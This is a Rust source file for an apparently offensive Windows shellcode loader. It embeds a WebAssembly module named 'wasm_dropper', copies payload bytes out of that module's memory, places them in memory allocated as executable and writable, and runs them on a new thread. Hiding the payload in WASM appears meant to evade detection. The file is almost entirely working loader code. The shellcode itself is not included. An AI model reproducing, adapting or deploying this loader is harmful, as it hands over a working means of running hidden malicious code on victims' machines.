#[cfg(windows)]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
#[cfg(windows)]
use winapi::um::processthreadsapi::CreateThread;
#[cfg(windows)]
use winapi::um::synchapi::WaitForSingleObject;
#[cfg(windows)]
use winapi::um::memoryapi::{VirtualAlloc};
use std::error::Error;
use wasmtime::*;
#[cfg(windows)]
use std::ptr;

fn main() -> Result<(), Box<dyn Error>> {
    #[cfg(windows)]
    {
        execute_shellcode()?;
    }
    
    #[cfg(not(windows))]
    {
        eprintln!("This program is designed to run on Windows only.");
        eprintln!("The shellcode execution functionality requires Windows APIs.");
    }

    Ok(())
}

#[cfg(windows)]
fn execute_shellcode() -> Result<(), Box<dyn Error>> {
    let engine = Engine::default();
    let mut store = Store::new(&engine, ());

    // Embed the .wat file content to avoid path length issues
    let function = include_str!("wasm_dropper.wat");

    // Create a linker to define required imports
    let mut linker = Linker::new(&engine);

    // Define __wbindgen_placeholder__.__wbindgen_describe
    linker.func_wrap(
        "__wbindgen_placeholder__",
        "__wbindgen_describe",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_grow
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_grow",
        |size: i32| -> Result<i32> {
            // Return size as a placeholder
            Ok(size)
        },
    )?;

    // Define __wbindgen_externref_xform__.__wbindgen_externref_table_set_null
    linker.func_wrap(
        "__wbindgen_externref_xform__",
        "__wbindgen_externref_table_set_null",
        |_: i32| {
            // Minimal stub
            Ok(())
        },
    )?;

    // Compile the module from string
    let module = Module::new(&engine, function)?;
    println!("Instantiated Module");

    // Instantiate with linker
    let instance = linker.instantiate(&mut store, &module)?;
    println!("Instantiated Instance");

    // Get exported functions
    let read_func = instance
        .get_func(&mut store, "read_wasm_at_index")
        .expect("`read_wasm_at_index` was not an exported function")
        .typed::<u32, u32>(&store)?;

    let mem_size_func = instance
        .get_func(&mut store, "get_wasm_mem_size")
        .expect("couldn't get mem size")
        .typed::<(), u32>(&store)?;

    let buff_size = mem_size_func.call(&mut store, ())?;
    let mut shellcode_buffer: Vec<u8> = vec![0x00; buff_size as usize];

    // Copy shellcode from WASM to buffer
    for i in 0..buff_size {
        shellcode_buffer[i as usize] = read_func.call(&mut store, i)? as u8;
    }

    // Allocate executable memory
    let alloc_ptr = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            buff_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if alloc_ptr.is_null() {
        return Err("VirtualAlloc failed".into());
    }

    // Copy shellcode to allocated memory
    unsafe {
        ptr::copy_nonoverlapping(shellcode_buffer.as_ptr(), alloc_ptr as *mut u8, buff_size as usize);
    }

    // Create and run thread to execute shellcode
    let mut thread_id: u32 = 0;
    let thread_handle = unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(alloc_ptr)),
            ptr::null_mut(),
            0,
            &mut thread_id,
        )
    };
    if thread_handle.is_null() {
        return Err("CreateThread failed".into());
    }

    // Wait for thread to complete
    unsafe {
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    Ok(())
}